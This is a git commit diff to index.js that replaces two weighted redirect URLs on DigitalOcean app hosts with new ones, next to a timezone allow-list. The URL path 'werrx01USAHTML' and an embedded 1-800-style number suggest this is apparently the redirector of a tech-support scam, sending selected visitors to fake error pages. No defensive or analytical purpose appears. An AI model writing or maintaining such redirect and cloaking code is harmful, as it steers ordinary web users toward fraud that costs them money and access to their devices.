79c0b650bbf441b6f21552d3a0591d05b60e41c6
paalakash <palaksh452@gmail.com>
2026-06-04 08:18:06 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://octopus-app-ndtbw.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 },
-    { url: "https://octopus-app-ndtbw.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 }
+    { url: "https://jellyfish-app-jsmy7.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 },
+    { url: "https://jellyfish-app-jsmy7.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 }
 
 ];
 
